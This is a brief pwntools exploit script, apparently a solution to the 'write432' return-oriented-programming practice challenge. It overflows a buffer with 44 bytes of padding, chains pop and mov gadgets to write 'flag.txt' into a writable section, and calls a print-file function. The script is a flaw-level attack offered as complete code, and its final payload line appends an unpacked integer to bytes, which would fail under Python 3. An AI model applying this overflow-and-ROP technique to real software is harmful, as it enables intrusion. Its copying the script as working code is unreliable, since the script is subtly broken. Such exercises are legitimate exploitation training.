#!/bin/python3

from pwn import *

programm = "./write432"

p = process(programm)
elf = ELF(programm)
p.recvuntil(">")

payload = b""
payload += b"A" * 44 # padding

gadget = p32(0x080485aa)
write_section = 0x0804af00
func = p32(0x080483d0)
mov_gadget = p32(0x08048543)

payload += gadget
payload += p32(write_section)
payload += b"flag"
payload += mov_gadget
payload += gadget
payload += p32(write_section + 4)
payload += b".txt"
payload += mov_gadget

payload += func
payload += p32(0x0)
payload += write_section

p.sendline(payload)

print(p.recvall())
